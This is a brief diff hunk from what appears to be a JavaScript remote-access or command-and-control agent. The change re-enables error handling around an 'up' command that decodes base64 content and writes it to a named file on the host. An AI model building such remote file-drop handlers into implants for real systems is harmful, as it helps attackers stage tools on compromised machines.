@@ -213,7 +213,7 @@ function main()
 	  }
 
                 else if(jsObject.cmnd.split(" ")[0] == "up") {
-                  //try {
+                  try {
                     var array = jsObject.cmnd.split(" ")
                     content = b64d(array[1], "bin")
                     array.shift()
@@ -221,10 +221,10 @@ function main()
                     filename = array.join(" ")
                     writebinfile(filename, content)
                     retval = "[*] File uploaded: " + filename
-                  //}
-                  //catch (e) {
-                  //  retval = "[-] Could not upload file: " + filename
-                  //}
+                  }
+                  catch (e) {
+                    retval = "[-] Could not upload file: " + filename
+                  }
                 }
 
 	    //credit to nate and 0sum
